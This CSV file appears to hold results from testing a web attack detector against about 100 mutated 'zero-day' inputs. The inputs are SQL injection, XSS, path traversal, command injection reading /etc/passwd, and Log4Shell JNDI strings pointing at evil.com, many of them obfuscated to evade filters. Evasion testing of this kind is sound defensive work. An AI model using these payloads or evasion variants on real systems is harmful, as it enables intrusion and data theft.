type,payload,detected,confidence,anomaly,latency_ms
Known SQLi,admin' OR '1'='1,True,0.9999890491343497,False,183.929
Known XSS,<script>alert('xss')</script>,True,0.9999890491343497,False,151.857
Known Path Traversal,../../etc/passwd,True,0.9999890491343497,False,127.561
Known RCE,; cat /etc/passwd,True,0.9999890491343497,False,141.196
Normal Request,GET /home HTTP/1.1,True,0.7249890491343497,False,141.547
Zero-day #1,../../et%63/pa%73s%77%64,True,0.6670486005054224,False,144.183
Zero-day #2,".
.	/. .	/.
.	/w i
nd o
w s /	s y s
t	e m3
2
",True,0.8596203282996953,False,135.592
Zero-day #3,../%2e%2e%2f../win%64o%77s/%73y%73%74em32,False,0.3550109508656504,False,149.655
Zero-day #4,../../etc/passwd,True,0.9999890491343497,False,165.72
Zero-day #5,%3b%20c%61t %2fetc/pa%73s%77d,True,0.3550109508656504,False,136.113
Zero-day #6,; ca%74 /etc/pas%73wd,True,0.9599890491343497,False,143.558
Zero-day #7,"'
  UN
I
O	N  S
E L	E
CT  N U
L	L	-
-",True,0.6920486005054224,False,147.473
Zero-day #8,<script>alert(1)</script>,True,0.9899890491343497,False,142.479
Zero-day #9,'/**/UNION/**/SELECT/**/NULL--,True,0.9196203282996953,False,136.846
Zero-day #10,<img src=x onerror=alert(1)>/**/,True,0.9449890491343497,False,178.561
Zero-day #11,'/**/OR/**/'1'='1,True,0.9799890491343497,False,178.054
Zero-day #12,../../etc/passwd,True,0.9999890491343497,False,166.543
Zero-day #13,../../etc/passwd,True,0.9999890491343497,False,130.685
Zero-day #14,../../../WiNdOWs/sYsTeM32,True,0.9999890491343497,False,149.633
Zero-day #15,../../etc/passwd&&,True,0.9999890491343497,False,138.101
Zero-day #16,"'	  U	N	I
ON
 S	E L
E	CT  	N U
L
L
--
",True,0.6820486005054224,False,152.837
Zero-day #17,'/**/UNION/**/SELECT/**/NULL--,True,0.9196203282996953,False,146.099
Zero-day #18,;/**/cat/**//etc/passwd,True,0.9899890491343497,False,166.616
Zero-day #19,.%2e/../..%2fwindows/%73yste%6d3%32,False,0.3750109508656504,False,159.193
Zero-day #20,' UNION SELECT NULL----,True,0.9999890491343497,False,147.144
Zero-day #21,$%7bjndi%3al%64ap%3a%2f/%65vil%2ec%6fm},False,0.3200109508656504,False,159.399
Zero-day #22,%24%7bjnd%69:%6cdap%3a/%2f%65v%69l.com},False,0.3200109508656504,False,143.421
Zero-day #23,${jndi:ldap://evil.com}&&,True,0.3700109508656504,False,140.713
Zero-day #24,%3cscr%69pt>a%6ce%72%74(1)<%2fscript%3e,True,0.9149890491343496,False,140.999
Zero-day #25,${jndi:ldap://evil.com}/**/,False,0.38024347310429957,False,163.621
Zero-day #26,<script>alert(1)</script>;,True,0.9649890491343497,False,164.093
Zero-day #27,".
.
/.	./ e t c
/
pa	s
s
w	d
",True,0.6620486005054225,False,146.663
Zero-day #28,../../etc/passwd--,True,0.9999890491343497,False,133.368
Zero-day #29,../../ETC/PaSSWd,True,0.9999890491343497,False,123.517
Zero-day #30,' UNION SELECT NULL--&&,True,0.9999890491343497,False,140.577
Zero-day #31,<img src=x onerror=alert(1)>&&,True,0.9949890491343496,False,159.884
Zero-day #32,../../../windows/system32,True,0.9999890491343497,False,172.339
Zero-day #33,${jndi:ldap://evil.com}/**/,False,0.38024347310429957,False,130.434
Zero-day #34,<img/**/src=x/**/onerror=alert(1)>,True,0.9549890491343497,False,130.012
Zero-day #35,..%2f.%2e%2f%65tc/%70asswd,True,0.4150109508656504,False,133.984
Zero-day #36,"' 
UNIO
N  
S E
L	E	C T
 	NU	L
L
-
-	",True,0.6920486005054224,False,133.852
Zero-day #37,${jndi:LdAp://EVil.COM},True,0.9049890491343497,False,129.982
Zero-day #38,<i%6dg src=%78 oner%72%6f%72=al%65%72%74(1)>,True,0.9049890491343497,False,145.32
Zero-day #39,../../etc/passwd,True,0.9999890491343497,False,138.236
Zero-day #40,'/**/OR/**/'1'='1,True,0.9799890491343497,False,145.034
Zero-day #41,"< im g  
s r	c	=	x	 
o n	e
rr	o r	=ale	rt(1 )
>
",False,0.4050109508656504,False,132.986
Zero-day #42,' UniON sElECT nUll--,True,0.9999890491343497,False,134.304
Zero-day #43,%27 %55NION SELECT%20NULL--,True,0.41001095086565037,False,127.691
Zero-day #44,;/**/cat/**//etc/passwd,True,0.9899890491343497,False,148.258
Zero-day #45,; cat%20/e%74%63%2fpassw%64,True,0.3700109508656504,False,172.119
Zero-day #46,<%69m%67%20%73rc=%78 onerror=ale%72t(1)%3e,False,0.3900109508656504,False,136.66
Zero-day #47,' %55N%49ON SELE%43%54 %4eUL%4c--,False,0.4500109508656504,False,154.171
Zero-day #48,%27 OR%20%271'=%271,True,0.9899890491343497,False,192.057
Zero-day #49,' OR%20'1%27='1,True,0.9999890491343497,False,164.589
Zero-day #50,"${ j
n di:	l dap : /
/ e
vi
l	.
c
om}	",False,0.3050109508656504,False,159.049
Zero-day #51,%27 %55NI%4fN S%45LE%43T NU%4c%4c-%2d,False,0.4150109508656504,False,128.732
Zero-day #52,'/**/OR/**/'1'='1,True,0.9799890491343497,False,100.192
Zero-day #53,' U%4eIO%4e%20S%45LE%43%54%20%4e%55%4cL--,True,0.6820486005054224,False,82.483
Zero-day #54,../../../windows/system32,True,0.9999890491343497,False,112.354
Zero-day #55,${jNdi:ldap://EVil.COm},True,0.9049890491343497,False,96.368
Zero-day #56,${j%6edi:%6c%64a%70%3a/%2f%65%76%69%6c.%63om%7d,False,0.3100109508656504,False,151.585
Zero-day #57,'/**/UNION/**/SELECT/**/NULL--,True,0.9196203282996953,False,74.893
Zero-day #58,' Or '1'='1,True,0.9999890491343497,False,82.593
Zero-day #59,%2e.%2f%2e./.%2e/%77in%64ows%2f%73ys%74em32,False,0.3600109508656504,False,79.74
Zero-day #60,${jndi:%6cda%70://evi%6c.c%6fm%7d,False,0.3400109508656504,False,70.15
Zero-day #61,<img src=x onerror=alert(1)>;,True,0.9999890491343497,False,80.33
Zero-day #62,; cat /etc/passwd/**/,True,0.9899890491343497,False,81.792
Zero-day #63,../../../windows/system32,True,0.9999890491343497,False,75.912
Zero-day #64,' OR%20%271%27%3d'%31,True,0.9999890491343497,False,77.529
Zero-day #65,"<
i
m	g
 
s	r	c
=x	 	o	n	err o r
=	a
le	r	t
(
1 )>	",False,0.4400109508656504,False,86.205
Zero-day #66,../../ETC/PaSSWd,True,0.9999890491343497,False,82.084
Zero-day #67,<i%6dg%20s%72c=x%20on%65rro%72%3d%61lert(1%29>,False,0.3850109508656504,False,87.454
Zero-day #68,<script>alert(1)</script>,True,0.9899890491343497,False,93.423
Zero-day #69,${jndi:ldap://evil.com};,True,0.8999890491343496,False,80.464
Zero-day #70,"< i	m	g
 
s r	c	=	x 
o
ne	r	r	o	r	=	a
l e rt	( 1)	>",False,0.4450109508656504,False,87.409
Zero-day #71,' OR '1'='1,True,0.9999890491343497,False,90.655
Zero-day #72,.%2e%2f%2e%2e/e%74c/pas%73%77d,True,0.6620486005054225,False,90.787
Zero-day #73,<img src=x onerror=alert(1)>&&,True,0.9949890491343496,False,82.448
Zero-day #74,;/**/cat/**//etc/passwd,True,0.9899890491343497,False,88.92
Zero-day #75,<script>alert(1)</script>&&,True,0.9649890491343497,False,95.402
Zero-day #76,' UNION SELECT NULL--&&,True,0.9999890491343497,False,85.021
Zero-day #77,<img src=x onerror=alert(1)>--,True,0.9949890491343496,False,83.833
Zero-day #78,../../EtC/pASswD,True,0.9999890491343497,False,117.981
Zero-day #79,%2e.%2f%2e.%2f..%2fwindo%77%73%2f%73ystem3%32,True,0.6620486005054225,False,95.611
Zero-day #80,%3b %63at %2f%65t%63/p%61ss%77d,False,0.4150109508656504,False,92.383
Zero-day #81,' Or '1'='1,True,0.9999890491343497,False,94.917
Zero-day #82,<script>alert(1)</script>;,True,0.9649890491343497,False,92.283
Zero-day #83,"<	i m g   s
rc=x   o n
e rr
or	=
a l	e
rt
(
1	)> ",False,0.4400109508656504,False,102.498
Zero-day #84,../../etc/passwd||,True,0.9999890491343497,False,102.28
Zero-day #85,".	./	.	. /	.	./	wi n do	w s /
s
y
s	t em3	2
",True,0.8596203282996953,False,95.392
Zero-day #86,../../etc/passwd,True,0.9999890491343497,False,126.49
Zero-day #87,' OR '1'='1&&,True,0.9999890491343497,False,98.703
Zero-day #88,${j%6ed%69:l%64ap%3a%2f/e%76%69%6c.c%6fm},False,0.3300109508656504,False,107.178
Zero-day #89,; caT /eTC/PasSwd,True,0.9999890491343497,False,90.38
Zero-day #90,../../../wINDoWS/syStEm32,True,0.9999890491343497,False,82.979
Zero-day #91,' UNION SELECT NULL--&&,True,0.9999890491343497,False,99.102
Zero-day #92,<%69mg s%72c=%78 onerro%72=%61%6cert(1)%3e,False,0.3900109508656504,False,100.095
Zero-day #93,' U%4eI%4fN SELE%43T NUL%4c%2d-,True,0.4250109508656504,False,99.575
Zero-day #94,"../ . .
/
e
t
c
/p
as
sw d
",True,0.6670486005054224,False,99.495
Zero-day #95,'/**/OR/**/'1'='1,True,0.9799890491343497,False,83.455
Zero-day #96,"'  
UNIO
N  SEL E
C T 
N
UL L
-
- ",True,0.7070486005054224,False,110.571
Zero-day #97,<img src=x onerror=alert(1)>&&,True,0.9949890491343496,False,101.801
Zero-day #98,"<
s	cr	i	pt>
al e
r t(1 )</
s c
ri	p	t> ",True,0.8999890491343496,False,101.144
Zero-day #99,". .
/ .
.
/e	t	c	/ p a s	s	w
d
",True,0.6620486005054225,False,100.453
Zero-day #100,%27 OR '1'='1,True,0.9999890491343497,False,111.471
Benign #1,POST /api/users/641,True,0.6749890491343497,False,107.611
Benign #2,POST /api/users/520,True,0.6749890491343497,False,86.25
Benign #3,GET /search?q=aTuNiImirZ,False,0.18001095086565036,False,98.375
Benign #4,POST /api/users/760,True,0.6749890491343497,False,84.301
Benign #5,GET /contact.html,True,0.7849890491343496,False,115.284
Benign #6,POST /api/users/593,True,0.6749890491343497,False,107.192
Benign #7,POST /form data=52,True,0.8199890491343497,False,102.027
Benign #8,GET /search?q=liJKzJwz,True,0.7199890491343497,False,122.1
Benign #9,GET /search?q=ESqhGarqlI,False,0.18501095086565036,False,109.111
